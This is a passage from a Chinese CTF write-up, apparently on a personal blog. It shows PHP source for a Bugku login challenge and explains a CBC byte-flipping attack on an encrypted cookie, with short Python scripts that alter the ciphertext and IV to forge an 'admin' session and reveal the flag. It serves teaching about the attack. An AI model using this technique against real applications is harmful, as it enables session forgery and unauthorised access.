base64_decode($_COOKIE[<span class="hljs-string">"iv"</span>]);</span><br><span class="line">        <span class="hljs-keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="hljs-string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="hljs-string">'username'</span>] = $info[<span class="hljs-string">'username'</span>];</span><br><span class="line">        &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_homepage</span><span class="hljs-params">()</span></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">"username"</span>]===<span class="hljs-string">'admin'</span>)&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="hljs-string">'username'</span>].<span class="hljs-string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="hljs-string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="hljs-string">'password'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span>($username === <span class="hljs-string">'admin'</span>)&#123;</span><br><span class="line">        <span class="hljs-keyword">exit</span>(<span class="hljs-string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="hljs-keyword">array</span>(<span class="hljs-string">'username'</span>=&gt;$username,<span class="hljs-string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;body class="login-body"&gt;</span></span><br><span class="line"><span class="hljs-string">                &lt;div id="wrapper"&gt;</span></span><br><span class="line"><span class="hljs-string">                    &lt;div class="user-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="hljs-string">                    &lt;div class="pass-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="hljs-string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;</span></span><br><span class="line"><span class="hljs-string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="hljs-string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="hljs-string">                &lt;/div&gt;</span></span><br><span class="line"><span class="hljs-string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;因为<code>admin</code>用户被禁止了登陆，但是可以利用反序列化漏洞重置<code>$_SESSION[&#39;username&#39;]</code>为<code>admin</code>，然后拿到flag。</p>
+<p>&emsp;&emsp;首先介绍一下<code>CBC字节翻转攻击</code>，如果我们要想把第二行（段）中的<code>2</code>变成<code>n</code>，我们只需要修改第一行（段）的<code>r</code>。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">原文：</span><br><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admi2&quot;;s:8:&quot;password&quot;;s:5:&quot;skctf&quot;;&#125;</span><br><span class="line">按16个字符分割：</span><br><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;admi2&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:5:&quot;skctf&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/108.png"><br></div><br>&emsp;&emsp;修改方式就是：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bs_de = <span class="hljs-string">'a:2:&#123;s:8:"username";s:5:"admi2";s:8:"password";s:5:"skctf";&#125;'</span></span><br><span class="line">bs_de=bs_de[<span class="hljs-number">0</span>:<span class="hljs-number">13</span>]+chr(ord(bs_de[<span class="hljs-number">13</span>]) ^ ord(<span class="hljs-string">'2'</span>) ^ ord(<span class="hljs-string">'n'</span>))+bs_de[<span class="hljs-number">14</span>:]</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;我们把<code>cookie</code>中的<code>cipher</code>拿出来修改一下。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">bs = <span class="hljs-string">'e8SnC9p3aEmJciIN8NWYM1PcA/A7jSwsiTglqdBMLRLf/8LOHKmhOoHSOBbJB1xEnE6S6DpfgkD8NWlJETxDZQ=='</span></span><br><span class="line">bs_de = base64.b64decode(bs)</span><br><span class="line">ch = chr(ord(bs_de[<span class="hljs-number">13</span>]) ^ ord(<span class="hljs-string">'2'</span>) ^ ord(<span class="hljs-string">'n'</span>))</span><br><span class="line"></span><br><span class="line">bs_de=bs_de[<span class="hljs-number">0</span>:<span class="hljs-number">13</span>]+ch+bs_de[<span class="hljs-number">14</span>::]</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(bs_de))</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;然后把得到的结果替换掉<code>cipher</code>，访问后可以发现反序列化出错了。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/109.png"><br></div><br>&emsp;&emsp;这是因为在修改<code>第二段明文</code>的时候我们把<code>第一段的密文</code>破环掉了，造成后台无法解密出原来的数据。如下面这种情况。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/110.png"><br></div><br>&emsp;&emsp;当将<code>6</code>修改成<code>7</code>的时候，造成了第一段密文解密出来的结果变成了乱码，所以我们还需要还原<code>第一段的密文</code>，所以我们要对<code>iv</code>这个初始向量进行修改。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/111.png"><br></div><br>&emsp;&emsp;修改的方法还是跟上面一样的套路，只不过这里的<code>cipher</code>要变成上面提示<code>反序列化</code>错误的那个密文。因为这个反序列化错误的字符是<code>第一次翻转后的明文</code>。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/112.png"><br></div><br>&emsp;&emsp;所以，我们修改的代码如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line">mingwen_de=<span class="hljs-string">'xvFs8hcryE3UwXuTa5b+7W1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjg6IlBhc3N3b3JkIjt9'</span></span><br><span class="line">mingwen = base64.b64decode(mingwen_de)</span><br><span class="line"></span><br><span class="line">iv = <span class="hljs-string">'wJdHFG15Qc2hs1bkgMHd4w=='</span></span><br><span class="line">iv_de = base64.b64decode(iv)</span><br><span class="line">new = <span class="hljs-string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):</span><br><span class="line">    iv_de = iv_de[:i] + chr(ord(iv_de[i]) ^ ord(mingwen[i]) ^ ord(new[i])) + iv_de[i+<span class="hljs-number">1</span>:]</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(iv_de))</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;将得到的结果替换到<code>iv</code>上，然后刷新页面，就能看到flag了。</p>
+<p><div align="center"><br>    <img src="/images/posts/bugku/113.png"><br></div><br>&emsp;&emsp;<b>参考链接：</b><br><a href="http://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">CBC字节翻转攻击</a><br><br><a href="http://drops.xmd5.com/static/drops/tips-7828.html" target="_blank" rel="noopener">CBC字节翻转攻击</a></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2018/03/ecshop/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">渗透某不可言语的商场</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2018/03/jwt-bypass/">
+                <span class="level-item">JWT token破解绕过</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+</div>
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    <img class="image is-128x128 has-mb-6" src="/images/avatar.png" alt="Junay">
+                    
+                    <p class="is-size-4 is-block">
+                        Junay
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        Junay&#39;s blog
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Shanghai</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        56
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        2
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        18
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/delcoding">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/delcoding">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Facebook" href="http://facebook.com">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="http://twitter.com">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Dribbble" href="http://dribbble.com">
+                
+                <i class="fab fa-dribbble"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+        
+
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">7</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/jekyll-update/">
+            <span class="level-start">
+                <span class="level-item">jekyll update</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">27</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/bypass-pie/" style="font-size: 10px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a>
+    </div>
+</div>
+
+    
+    
+        <div class="card card-transparent is-hidden-widescreen">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/got-plt-study/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
+                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/seccon2018-web-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="SECCON 2018 GhostKingdom writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-01T03:47:56.000Z">2018-11-01</time></div>
+                    <a href="/2018/11/seccon2018-web-writeup/" class="has-link-black-ter is-size-6">SECCON 2018 GhostKingdom writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/Nginx-nodejs-socket/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="【笔记】部署nodejs+socket.io+nginx (https)">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-12T08:47:56.000Z">2018-10-12</time></div>
+                    <a href="/2018/10/Nginx-nodejs-socket/" class="has-link-black-ter is-size-6">【笔记】部署nodejs+socket.io+nginx (https)</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/oracle-sqli-get-shell/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Oracle 从sqli到get (root) shell">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-02T08:47:56.000Z">2018-10-02</time></div>
+                    <a href="/2018/10/oracle-sqli-get-shell/" class="has-link-black-ter is-size-6">Oracle 从sqli到get (root) shell</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/06/">
+                <span class="level-start">
+                    <span class="level-item">六月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">14</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <ul class="menu-list">
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/BlockChain/">
+                        <span class="level-start">
+                            <span class="level-item">BlockChain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CTF/">
+                        <span class="level-start">
+                            <span class="level-item">CTF</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">12</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CVE/">
+                        <span class="level-start">
+                            <span class="level-item">CVE</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Hack/">
+                        <span class="level-start">
+                            <span class="level-item">Hack</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Oracle/">
+                        <span class="level-start">
+                            <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/bypass-pie/">
+                        <span class="level-start">
+                            <span class="level-item">bypass pie</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/kali/">
+                        <span class="level-start">
+                            <span class="level-item">kali</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mongodb/">
+                        <span class="level-start">
+                            <span class="level-item">mongodb</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/office/">
+                        <span class="level-start">
+                            <span class="level-item">office</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/pwn/">
+                        <span class="level-start">
+                            <span class="level-item">pwn</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/web3/">
+                        <span class="level-start">
+                            <span class="level-item">web3</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/windows/">
+                        <span class="level-start">
+                            <span class="level-item">windows</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/writeup/">
+                        <span class="level-start">
+                            <span class="level-item">writeup</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xammpp/">
+                        <span class="level-start">
+                            <span class="level-item">xammpp</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xdebug/">
+                        <span class="level-start">
+                            <span class="level-item">xdebug</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/爬虫绕过/">
+                        <span class="level-start">
+                            <span class="level-item">爬虫绕过</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/百度云/">
+                        <span class="level-start">
+                            <span class="level-item">百度云</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/笔记/">
+                        <span class="level-start">
+                            <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/got-plt-study/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
+                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/seccon2018-web-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="SECCON 2018 GhostKingdom writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-01T03:47:56.000Z">2018-11-01</time></div>
+                    <a href="/2018/11/seccon2018-web-writeup/" class="has-link-black-ter is-size-6">SECCON 2018 GhostKingdom writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/Nginx-nodejs-socket/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="【笔记】部署nodejs+socket.io+nginx (https)">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-12T08:47:56.000Z">2018-10-12</time></div>
+                    <a href="/2018/10/Nginx-nodejs-socket/" class="has-link-black-ter is-size-6">【笔记】部署nodejs+socket.io+nginx (https)</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/oracle-sqli-get-shell/" class="media-left">
+                <p class="image is-64x64">
